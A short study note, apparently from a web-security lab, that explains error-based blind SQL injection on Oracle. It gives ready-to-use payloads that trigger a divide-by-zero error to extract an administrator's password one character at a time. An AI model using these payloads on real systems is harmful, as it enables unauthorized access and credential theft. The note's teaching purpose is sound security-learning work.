🔍 The Core Idea (Simplified):
You're going to:

Write a SQL condition.

If the condition is true, you force a database error (like divide by 0).

Watch how the app behaves.

If it errors → the condition was true

If it loads normally → the condition was false

This way, you can find out secret data (like a password) one letter at a time — without seeing the actual data.

🧠 Think of it like this:
You're asking the app:

"Hey app, is the first letter of the admin’s password greater than 'm'? If yes, then CRASH the DB (1/0). If no, just return 'a'."

And then you watch if the app breaks.


PAYLOAD !!(DEFAULT)
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

WORKING PAYLOAD
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator') > 0 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
' AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--

' AND (SELECT CASE WHEN SUBSTR((select password from users where username='administrator'),1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
